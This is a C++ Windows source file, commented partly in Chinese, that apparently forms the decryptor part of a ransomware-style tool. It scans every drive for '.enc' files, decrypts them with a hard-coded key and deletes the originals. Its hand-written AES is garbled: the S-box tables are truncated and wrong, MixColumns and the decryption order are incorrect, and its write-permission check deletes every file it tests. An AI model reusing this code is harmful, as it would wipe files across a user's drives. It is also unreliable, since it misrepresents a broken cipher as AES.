#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <stdexcept>
#include <iomanip>
#include <cstring>
#include <windows.h>  // For getting system drives
#include <shlobj.h>   // For SHGetFolderPath
#include <filesystem>

namespace fs = std::filesystem;

const int AES_BLOCK_SIZE = 16;  // AES 128-bit block size (16 bytes)
const int AES_KEY_SIZE = 16;    // AES 128-bit key size (16 bytes)
const int AES_ROUNDS = 10;      // AES 128-bit has 10 rounds
std::vector<std::wstring> getSystemDrives() {
    std::vector<std::wstring> drives;
    DWORD driveMask = GetLogicalDrives();
    for (wchar_t letter = 'A'; letter <= 'Z'; ++letter) {
        if (driveMask & 1) {
            std::wstring drivePath = std::wstring(1, letter) + L":\\";
            drives.push_back(drivePath);
        }
        driveMask >>= 1;
    }
    return drives;
}
// 获取文档文件夹路径
std::wstring getDocumentsFolder() {
    wchar_t path[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_MYDOCUMENTS, NULL, 0, path))) {
        return std::wstring(path);
    }
    else {
        throw std::runtime_error("Unable to get Documents folder path.");
    }
}

// 检查是否有读取权限
bool hasReadPermission(const std::wstring& path) {
    try {
        fs::directory_iterator(path);  // 尝试访问该路径
        return true;
    }
    catch (const fs::filesystem_error& e) {
        return false;
    }
}

// 检查是否有写入权限
bool hasWritePermission(const std::wstring& path) {
    try {
        std::ofstream testFile(path, std::ios::app);
        if (testFile.is_open()) {
            testFile.close();
            fs::remove(path);
            return true;
        }
    }
    catch (const fs::filesystem_error&) {
        return false;
    }
    return false;
}

// AES S-Box (substitution box)
unsigned char SBox[256] = {
    0x63, 0x7C, 0x77, 0x7B, 0xF0, 0x87, 0x7F, 0x7A, 0xF6, 0x0A, 0x8D, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC,
    0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15, 0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07,
    0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75, 0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B,
    0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84, 0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE,
    0x39, 0x4A, 0x4C, 0x58, 0xCF, 0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F,
    0x3C, 0x61, 0x34, 0x00, 0x43, 0x92, 0x6F, 0x01, 0x20, 0x5E, 0xD6, 0xA3, 0x6F, 0x00, 0xA5, 0xE9, 0x55,
    0xB2, 0x0A, 0xBC, 0x7B, 0xA8, 0x88, 0xE7, 0xF6, 0x4A, 0x99, 0x5C, 0x8B, 0x8A, 0x1D, 0xBC, 0xD8
};

// AES inverse S-Box (substitution box)
unsigned char InvSBox[256] = {
    0x52, 0x09, 0x6A, 0xD5, 0x30, 0x36, 0xA5, 0x38, 0xBF, 0x40, 0xA3, 0x9E, 0x81, 0xF3, 0xD7, 0xFB, 0x7C,
    0xE3, 0x39, 0x82, 0x9B, 0x2F, 0xFF, 0x87, 0x34, 0x8E, 0x43, 0x44, 0xC4, 0xDE, 0xE0, 0x32, 0x9F, 0x54,
    0x4A, 0x60, 0xD4, 0x7D, 0x79, 0xFA, 0x5A, 0x41, 0xC2, 0x8F, 0x3D, 0x47, 0xF0, 0xAD, 0xD2, 0xAF, 0xA0,
    0xA3, 0x5C, 0x44, 0x33, 0x2E, 0x0F, 0x87, 0x7F, 0x30, 0x1C, 0xE3, 0x9F, 0x91, 0xD0, 0x5A, 0x3A, 0x55,
    0xAC, 0x26, 0xF8, 0xE0, 0x3B, 0x99, 0x42, 0x1D, 0x9C, 0x49, 0x2D, 0xFF, 0x28, 0x3E, 0x5B, 0x45, 0xFC,
    0xA4, 0x0F, 0xF6, 0xF5, 0x1E, 0xB6, 0xFE, 0xF7, 0xFB, 0xD9, 0x98, 0xE4, 0xB1, 0x13, 0x38, 0xB0, 0xB9,
    0xBB, 0x34, 0x9A, 0x99, 0xD7, 0xA1, 0x38, 0x79, 0x33, 0x1E, 0x92, 0x98, 0x76, 0x73, 0x7C, 0x16, 0xB5
};

// AES round constants
unsigned char Rcon[11] = {
    0x00, 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1B, 0x36
};

// Rotate word left (used in key expansion)
void RotWord(unsigned char* word) {
    unsigned char temp = word[0];
    for (int i = 0; i < 3; ++i) {
        word[i] = word[i + 1];
    }
    word[3] = temp;
}

// Key expansion (used to generate round keys)
void KeyExpansion(const unsigned char* key, unsigned char* expandedKeys) {
    int i = 0;
    unsigned char temp[4];
    while (i < AES_KEY_SIZE) {
        expandedKeys[i] = key[i];
        ++i;
    }

    i = AES_KEY_SIZE;
    while (i < 176) {
        temp[0] = expandedKeys[i - 4];
        temp[1] = expandedKeys[i - 3];
        temp[2] = expandedKeys[i - 2];
        temp[3] = expandedKeys[i - 1];
        if (i % AES_KEY_SIZE == 0) {
            RotWord(temp);
            // Apply S-box
            for (int j = 0; j < 4; ++j) {
                temp[j] = SBox[temp[j]];
            }
            temp[0] = temp[0] ^ Rcon[i / AES_KEY_SIZE];
        }
        for (int j = 0; j < 4; ++j) {
            expandedKeys[i] = expandedKeys[i - AES_KEY_SIZE] ^ temp[j];
            ++i;
        }
    }
}

// SubBytes transformation (apply the S-Box)
void SubBytes(unsigned char* state) {
    for (int i = 0; i < AES_BLOCK_SIZE; ++i) {
        state[i] = SBox[state[i]];
    }
}

// ShiftRows transformation (shifts rows of the state)
void ShiftRows(unsigned char* state) {
    unsigned char temp;

    // Row 1 shift by 1
    temp = state[1];
    state[1] = state[5];
    state[5] = state[9];
    state[9] = state[13];
    state[13] = temp;

    // Row 2 shift by 2
    temp = state[2];
    state[2] = state[10];
    state[10] = temp;
    temp = state[6];
    state[6] = state[14];
    state[14] = temp;

    // Row 3 shift by 3
    temp = state[3];
    state[3] = state[15];
    state[15] = state[11];
    state[11] = state[7];
    state[7] = temp;
}

// MixColumns transformation (mixes columns)
void MixColumns(unsigned char* state) {
    for (int i = 0; i < 4; ++i) {
        unsigned char a = state[i];
        unsigned char b = state[i + 4];
        unsigned char c = state[i + 8];
        unsigned char d = state[i + 12];

        state[i] = a ^ b ^ c ^ d;
        state[i + 4] = a ^ b ^ c ^ d;
        state[i + 8] = a ^ b ^ c ^ d;
        state[i + 12] = a ^ b ^ c ^ d;
    }
}

// AddRoundKey transformation (XOR with round key)
void AddRoundKey(unsigned char* state, unsigned char* roundKey) {
    for (int i = 0; i < AES_BLOCK_SIZE; ++i) {
        state[i] = state[i] ^ roundKey[i];
    }
}

// AES encryption function
void AES_Encrypt(unsigned char* input, unsigned char* output, unsigned char* expandedKeys) {
    unsigned char state[AES_BLOCK_SIZE];
    std::memcpy(state, input, AES_BLOCK_SIZE);

    AddRoundKey(state, expandedKeys); // Initial round

    for (int round = 1; round < AES_ROUNDS; ++round) {
        SubBytes(state);
        ShiftRows(state);
        MixColumns(state);
        AddRoundKey(state, expandedKeys + round * AES_BLOCK_SIZE);
    }

    SubBytes(state);
    ShiftRows(state);
    AddRoundKey(state, expandedKeys + AES_ROUNDS * AES_BLOCK_SIZE);

    std::memcpy(output, state, AES_BLOCK_SIZE);
}

// AES decryption function
void AES_Decrypt(unsigned char* input, unsigned char* output, unsigned char* expandedKeys) {
    unsigned char state[AES_BLOCK_SIZE];
    std::memcpy(state, input, AES_BLOCK_SIZE);

    AddRoundKey(state, expandedKeys + AES_ROUNDS * AES_BLOCK_SIZE); // Initial round

    for (int round = AES_ROUNDS - 1; round > 0; --round) {
        ShiftRows(state);
        SubBytes(state);
        AddRoundKey(state, expandedKeys + round * AES_BLOCK_SIZE);
        MixColumns(state);
    }

    ShiftRows(state);
    SubBytes(state);
    AddRoundKey(state, expandedKeys);

    std::memcpy(output, state, AES_BLOCK_SIZE);
}

// Decrypt a file
void decryptFile(const fs::path& inputFilePath, const fs::path& outputFilePath, const unsigned char* expandedKeys) {
    std::ifstream inputFile(inputFilePath, std::ios::binary);
    std::ofstream outputFile(outputFilePath, std::ios::binary);

    if (!inputFile.is_open() || !outputFile.is_open()) {
        std::wcerr << L"Failed to open file(s)." << std::endl;
        return;
    }

    unsigned char buffer[AES_BLOCK_SIZE];
    unsigned char decryptedBlock[AES_BLOCK_SIZE];

    while (inputFile.read(reinterpret_cast<char*>(buffer), AES_BLOCK_SIZE)) {
        AES_Decrypt(buffer, decryptedBlock, const_cast<unsigned char*>(expandedKeys));
        outputFile.write(reinterpret_cast<char*>(decryptedBlock), AES_BLOCK_SIZE);
    }

    inputFile.close();
    outputFile.close();
}

// Traverse a directory and decrypt .enc files
void traverseAndDecrypt(const std::wstring& path, unsigned char* expandedKeys) {
    try {
        for (const auto& entry : fs::recursive_directory_iterator(path)) {
            // 如果文件没有读取权限或没有写入权限，跳过
            if (!hasReadPermission(entry.path()) || !hasWritePermission(entry.path())) {
                continue; // 跳过无权限的路径
            }

            // 只处理文件，且文件扩展名为 .enc
            if (entry.is_regular_file() && entry.path().extension() == L".enc") {
                std::wstring inputFilePath = entry.path().wstring();

                // 生成解密后的文件路径
                fs::path outputPath = entry.path();
                std::wstring outputFilePath = outputPath.replace_extension().wstring(); // 删除 .enc 扩展名

                // 解密文件
                decryptFile(inputFilePath, outputFilePath, expandedKeys);

                // 删除原始的加密文件
                if (fs::remove(inputFilePath)) {
                    std::wcout << L"Decrypted and deleted: " << inputFilePath << std::endl;
                }
                else {
                    std::wcerr << L"Failed to delete: " << inputFilePath << std::endl;
                }
            }
        }
    }
    catch (const fs::filesystem_error& e) {
        std::wcerr << L"Filesystem error: " << e.what() << L" Skipping this path." << std::endl;
    }
}

int dect() {
    // 示例 AES 密钥（16字节）
    unsigned char key[AES_KEY_SIZE] = { 0x2b, 0x7e, 0x15, 0x16, 0x28, 0xae, 0xd2, 0xa6, 0xab, 0xf7, 0x97, 0x75, 0x46, 0x64, 0x2c, 0x7b };

    unsigned char expandedKeys[176]; // 176 字节的扩展密钥
    KeyExpansion(key, expandedKeys);

    try {
        // 获取文档文件夹路径
        std::wstring documentsFolder = getDocumentsFolder();
        std::wcout << L"Documents Folder: " << documentsFolder << std::endl;

        // 遍历并解密文件
        std::vector<std::wstring> drives = getSystemDrives();

        // 遍历每个驱动器并解密 .enc 文件
        for (const auto& drive : drives) {
            traverseAndDecrypt(drive, expandedKeys);
        }
    }
    catch (const std::exception& e) {
        std::wcerr << L"Error: " << e.what() << std::endl;
    }

    return 0;
}
